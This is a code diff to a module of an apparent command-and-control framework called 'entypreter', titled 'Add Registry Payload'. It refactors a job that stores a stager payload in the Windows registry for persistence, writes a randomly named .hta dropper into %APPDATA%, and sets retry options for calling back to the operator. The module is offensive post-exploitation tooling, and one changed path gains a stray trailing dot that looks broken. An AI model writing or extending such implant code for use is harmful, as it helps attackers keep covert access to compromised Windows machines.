@@ -1,10 +1,26 @@
 import core.job
 import core.implant
+import core.loader
 import uuid
+import string
+import random
 
 class RegistryJob(core.job.Job):
 
     def create(self):
+        id = self.options.get("PAYLOAD")
+        payload = self.load_payload(id)
+        self.options.set("CMD", payload)
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
+        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
+
+        if self.options.get('DROPFILE'):
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+        else:
+            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
+            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
+
+        self.options.set("FHKEY", "entypreter.registry."+self.options.get("HKEY"))
         if self.session_id == -1:
             self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
             return False
@@ -13,9 +29,9 @@ class RegistryJob(core.job.Job):
         task = handler.get_header("Task", False)
         upload = handler.get_header('X-UploadFileJob', False)
         if upload == "true":
-            dropper_script = handler.loader.load_script(self.options.get("LDROPFILE"), self.options)
-            template = handler.loader.load_script("data/stager/js/mshta/template.hta")
-            fdata = handler.post_process_script(dropper_script, template, False)
+            dropper_script = core.loader.load_script(self.options.get("LDROPFILE"), self.options)
+            template = core.loader.load_script("data/stager/js/mshta/template.hta")
+            fdata = handler.post_process_script(dropper_script, template, self.options, self.session, False)
 
             headers = {}
             headers['Content-Type'] = 'application/octet-stream'
@@ -78,7 +94,7 @@ class RegistryJob(core.job.Job):
 class RegistryImplant(core.implant.Implant):
 
     NAME = "Add Registry Payload"
-    DESCRIPTION = "Adds an entypreter stager payload in the registry."
+    DESCRIPTION = "Adds a entypreter stager payload in the registry."
     AUTHORS = ["Entynetproject"]
     STATE = "implant/persist/registry"
 
@@ -87,7 +103,7 @@ class RegistryImplant(core.implant.Implant):
         self.options.register("CMD", "", "Command.", hidden=True)
         self.options.register("CLEANUP", "false", "Will remove the registry key.", enum=["true", "false"])
         self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output.", required=False)
-        self.options.register("LDROPFILE", "data/implant/persist/registry.dropper", "Local file to drop on the target.", advanced=True)
+        self.options.register("LDROPFILE", "data/implant/persist/registry.dropper.", "Local file to drop on the target.", advanced=True)
         self.options.register("DROPDIR", "%APPDATA%", "Directory to place the drop file.", advanced=True)
         self.options.register("FDROPDIR", "", "", hidden=True)
         self.options.register("RETRYATTEMPTS", "5", "Number of times to retry calling back before self-terminating (-1 == infinite).")
@@ -101,7 +117,6 @@ class RegistryImplant(core.implant.Implant):
         return RegistryJob
 
     def run(self):
-
         id = self.options.get("PAYLOAD")
         payload = self.load_payload(id)
 
@@ -109,21 +124,7 @@ class RegistryImplant(core.implant.Implant):
             self.shell.print_error("Payload %s not found." % id)
             return
 
-        self.options.set("CMD", payload)
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))
-
-        if self.options.get('DROPFILE'):
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-        else:
-            import string
-            import random
-            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
-            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
-
-        self.options.set("FHKEY", "entypreter.registry."+self.options.get("HKEY"))
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/persist/registry.js", self.options)
+        payloads["js"] = "data/implant/persist/registry.js"
 
         self.dispatch(payloads, self.job)
